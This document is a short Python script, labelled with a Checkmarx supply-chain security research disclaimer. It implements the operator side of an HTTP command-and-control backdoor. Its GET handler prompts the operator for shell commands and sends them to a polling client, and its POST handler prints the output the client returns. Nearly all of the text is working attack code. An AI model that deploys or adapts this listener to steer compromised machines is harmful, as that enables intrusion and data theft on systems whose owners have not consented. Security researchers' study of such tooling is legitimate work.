# DISCLAIMER
# This script is intended solely for research purposes and should only be executed in a controlled environment. It is designed to demonstrate potential security vulnerabilities and should not be used maliciously or for any unauthorized activities.
# If you have any questions or concerns regarding this experiment, please contact us at supplychainsecurity@checkmarx.com for clarification or assistance.
# By using this script, you agree to adhere to ethical and legal guidelines, and you accept all responsibility for any consequences that may arise from its use. Use it responsibly and only on systems and networks that you have explicit permission to access and assess.

from http.server import BaseHTTPRequestHandler, HTTPServer

SERVER_IP = '0.0.0.0'
SERVER_PORT = 30880
ALLOWED_CLIENTS = {"127.0.0.1"}


class MyHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        client_ip_address = self.client_address[0]
        if client_ip_address not in ALLOWED_CLIENTS:
            self.send_response(404)
            print(f'{client_ip_address} not allowed')
            self.end_headers()
            return

        command = input(f"{client_ip_address}$ ")
        command = command.encode()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()
        data = self.rfile.read(length).decode()
        print(data)


if __name__ == '__main__':
    myServer = HTTPServer((SERVER_IP, SERVER_PORT), MyHandler)

    try:
        myServer.serve_forever()
    except KeyboardInterrupt:
        myServer.server_close()
